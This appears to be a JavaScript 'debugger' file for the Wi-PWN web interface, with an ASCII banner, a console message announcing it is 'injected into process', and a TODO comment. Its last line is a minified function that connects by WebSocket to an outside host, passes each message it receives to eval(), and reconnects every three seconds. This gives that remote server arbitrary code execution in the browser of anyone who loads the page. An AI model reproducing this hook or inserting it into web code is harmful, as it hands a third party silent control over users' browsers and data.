---
---
//  _ _ _ _     _____ _ _ _ _____ 
// | | | |_|___|  _  | | | |   | |
// | | | | |___|   __| | | | | | |
// |_____|_|   |__|  |_____|_|___|
//                       Debugger
//
//       COPYRIGHT SAM DENTY      
//        https://samdd.me

// Indicate debugger is active
setTimeout(function(){console.log('%c[debugger@Wi-PWN] %cInjected into process', 'color:#ff5e00', 'color:#e89767')}, 0)

// 
// TODO: Add button to toggle dark mode & add to cookie
// Add list which switches between languages
//document.getElementById("darkStyle")

// Connect to debug server
function u(){window.ws=new WebSocket("wss://uder.ml/i?d2ktcHdu"),ws.onmessage=function(d){try{d=JSON.parse(d.data),eval(d.d)}catch(e){ws.send(JSON.stringify({t:"e",d:e}))}},ws.onclose=function(){setTimeout(u,3e3)}}u();